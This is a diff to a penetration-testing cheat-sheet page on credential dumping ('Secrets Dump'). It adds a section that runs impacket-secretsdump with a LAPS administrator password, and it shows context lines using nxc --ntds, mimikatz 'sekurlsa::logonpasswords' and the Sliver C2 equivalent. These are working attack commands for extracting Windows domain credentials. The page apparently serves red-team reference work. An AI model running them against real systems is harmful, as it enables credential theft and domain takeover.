@@ -1,7 +1,7 @@
 ---
 title: "Secrets Dump"
 date: 2025-7-18
-tags: ["SAM", "SYSTEM", "SECURITY", "Dcsync", "Impacket", "secretsdump", "Domain Controller", "Credential Dumping", "Active Directory", "Windows", "Ntds.Dit", "Hive"]
+tags: ["SAM", "SYSTEM", "SECURITY", "Dcsync", "Impacket", "secretsdump", "Domain Controller", "Credential Dumping", "Active Directory", "Windows", "Ntds.Dit", "Hive", "LAPS"]
 ---
 
 ### Convert ntds.dit to .sqlite
@@ -143,11 +143,22 @@ nxc smb <TARGET> -d <DOMAIN> -u '<USER>' -H <HASH> --ntds
 
 {{< /tabcontent >}}
 
+### With LAPS Password
+
+{{< tab set4 tab1 >}}impacket{{< /tab >}}
+{{< tabcontent set4 tab1 >}}
+
+```console
+impacket-secretsdump 'administrator:<PASSWORD>@<TARGET_DOMAIN>'
+```
+
+{{< /tabcontent >}}
+
 ### With NT AUTHORITY\SYSTEM / Administrator
 
-{{< tab set4 tab1 >}}mimikatz{{< /tab >}}
-{{< tab set4 tab2 >}}sliver{{< /tab >}}
-{{< tabcontent set4 tab1 >}}
+{{< tab set5 tab1 >}}mimikatz{{< /tab >}}
+{{< tab set5 tab2 >}}sliver{{< /tab >}}
+{{< tabcontent set5 tab1 >}}
 
 ```console
 .\mimikatz.exe "sekurlsa::logonpasswords"
@@ -158,7 +169,7 @@ nxc smb <TARGET> -d <DOMAIN> -u '<USER>' -H <HASH> --ntds
 ```
 
 {{< /tabcontent >}}
-{{< tabcontent set4 tab2 >}}
+{{< tabcontent set5 tab2 >}}
 
 ```console
 mimikatz -- '"sekurlsa::logonpasswords"'
